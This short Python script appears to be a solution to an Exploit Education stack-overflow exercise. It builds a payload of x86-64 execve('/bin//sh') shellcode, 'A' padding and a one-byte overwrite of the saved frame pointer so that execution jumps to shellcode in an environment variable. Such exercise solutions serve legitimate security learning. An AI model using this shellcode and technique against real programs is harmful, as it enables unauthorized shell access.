from pwn import *
import struct

#INPUT_SIZE = 127

LSB = "\xe0" # modify last bit of rbp -> make rsp = rbp + 0x8 (after leave function of main)
              # --> RIP store at that address is address of ExploitEducation env variable
              # Therefore, we can pace shellcode in our env variable
              #RIP = struct.pack("L", 0xaaaa7fffffffeeea)

SC = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = SC + "A"*(126 - len(SC)) + LSB
print payload
#print len(payload)
